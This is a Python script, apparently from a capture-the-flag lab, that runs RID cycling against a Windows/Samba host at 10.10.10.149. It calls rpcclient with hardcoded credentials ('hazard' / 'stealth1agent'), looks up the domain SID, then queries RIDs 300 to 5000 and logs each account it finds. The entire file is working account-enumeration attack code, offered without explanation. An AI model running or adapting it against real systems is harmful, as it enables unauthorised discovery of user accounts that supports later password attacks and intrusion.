#!/usr/bin/env python3
# -*- encoding:utf-8 -*-
import sys
from subprocess import check_output
from subprocess import STDOUT
from copy import deepcopy

# rpcclient -W '$global_workgroup' -U '$global_username'%'$global_password' '$global_target' -c 'lookupsids $sid-$rid'

host = '10.10.10.149'
usernm = 'hazard'
passwd = 'stealth1agent'
workgd = 'SUPPORTDESK'
default_workgd = 'WORKGROUP'

cmd_template = ['rpcclient', '-W', workgd, '-U', usernm + '%' + passwd, host, '-c']


def check_pwd():
    curop = "'srvinfo'"
    cmd_t = deepcopy(cmd_template)
    cmd_t.append(curop)
    cmd = ' '.join(cmd_t)
    res = check_output(cmd, shell=True, stderr=STDOUT).decode()
    if 'NT_STATUS_' in res:
        print("Credentials Error or Server Does Not Allow Connection!")
        print(res)
        sys.exit(1)
    else:
        print("Credentials Correct! Server Alive!")


def get_currentsid():
    curop = "'" + 'lookupnames ' + usernm + "'"
    cmd_t = deepcopy(cmd_template)
    cmd_t.append(curop)
    cmd = ' '.join(cmd_t)
    res = check_output(cmd, shell=True, stderr=STDOUT).decode()
    if not 'NT_STATUS_' in res:
        r1 = res.split(' ')
        usersid = r1[-3]
        usergid = '-'.join(usersid.split('-')[:-1])
        return usergid + '-'
    else:
        print("Server error due to unknown reason.")
        print(res)
        sys.exit(2)


def rid_cycling(ugid):
    print("SID Prefix: " + ugid)
    for i in range(300, 5000):
        curop = "'" + 'lookupsids ' + ugid + str(i) + "'"
        cmd_t = deepcopy(cmd_template)
        cmd_t.append(curop)
        cmd = ' '.join(cmd_t)
        res = check_output(cmd, shell=True, stderr=STDOUT).decode()
        if not 'NT_STATUS_' in res:
            if not 'unknown' in res:
                print("** FOUND **")
                print(res)
                with open('rid_cycling_check.log', 'a') as ridc:
                    ridc.write(res)
                    ridc.flush()
            else:
                print(res)
        else:
            sys.exit(2)


def main():
    check_pwd()
    ugid = get_currentsid()
    rid_cycling(ugid)


if __name__ == '__main__':
    main()
